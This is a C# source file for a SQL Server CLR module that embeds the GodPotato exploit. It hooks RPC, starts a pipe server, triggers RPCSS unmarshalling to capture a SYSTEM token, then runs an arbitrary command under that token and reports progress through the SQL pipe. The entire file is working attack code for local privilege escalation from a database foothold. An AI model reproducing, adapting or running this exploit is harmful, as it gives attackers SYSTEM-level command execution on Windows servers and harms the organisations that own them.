using System;
using System.Security.Principal;
using SharpToken;
using GodPotato.NativeAPI;
using System.IO;
using Microsoft.SqlServer.Server;

namespace CLR_module;

internal class GodPotatoRun
{
    public static void GodPotatoPorc(string prog, string arg)
    {
        TextWriter ConsoleWriter = Console.Out;
        string lpCommandLine;
        try
        {
            GodPotatoContext godPotatoContext = new GodPotatoContext(ConsoleWriter, Guid.NewGuid().ToString());

            SqlContext.Pipe.Send(String.Format("[*] CombaseModule: 0x{0:x}", godPotatoContext.CombaseModule));
            SqlContext.Pipe.Send(String.Format("[*] DispatchTable: 0x{0:x}", godPotatoContext.DispatchTablePtr));
            SqlContext.Pipe.Send(String.Format("[*] UseProtseqFunction: 0x{0:x}", godPotatoContext.UseProtseqFunctionPtr));
            SqlContext.Pipe.Send(String.Format("[*] UseProtseqFunctionParamCount: {0}", godPotatoContext.UseProtseqFunctionParamCount));

            SqlContext.Pipe.Send("[*] HookRPC");
            godPotatoContext.HookRPC();
            SqlContext.Pipe.Send("[*] Start PipeServer");
            godPotatoContext.Start();
            GodPotatoUnmarshalTrigger unmarshalTrigger = new GodPotatoUnmarshalTrigger(godPotatoContext);
            try
            {
                SqlContext.Pipe.Send("[*] Trigger RPCSS");
                int hr = unmarshalTrigger.Trigger();
                SqlContext.Pipe.Send(String.Format("[*] UnmarshalObject: 0x{0:x}", hr));

            }
            catch (Exception e)
            {
                SqlContext.Pipe.Send(e.ToString());
            }


            WindowsIdentity systemIdentity = godPotatoContext.GetToken();
            if (systemIdentity != null)
            {
                SqlContext.Pipe.Send("[*] CurrentUser: " + systemIdentity.Name);
                if (prog.Length == 0)
                {
                    lpCommandLine = "cmd /c " + arg;
                }
                else
                {
                    lpCommandLine = prog + " " + arg;
                }
                 
                TokenuUils.createProcessReadOut(ConsoleWriter, systemIdentity.Token, lpCommandLine);

            }
            else
            {
                SqlContext.Pipe.Send("[!] Failed to impersonate security context token");
            }
            godPotatoContext.Restore();
            godPotatoContext.Stop();
        }
        catch (Exception e)
        {
            SqlContext.Pipe.Send("[!] " + e.Message);

        }

    }
    
            
}
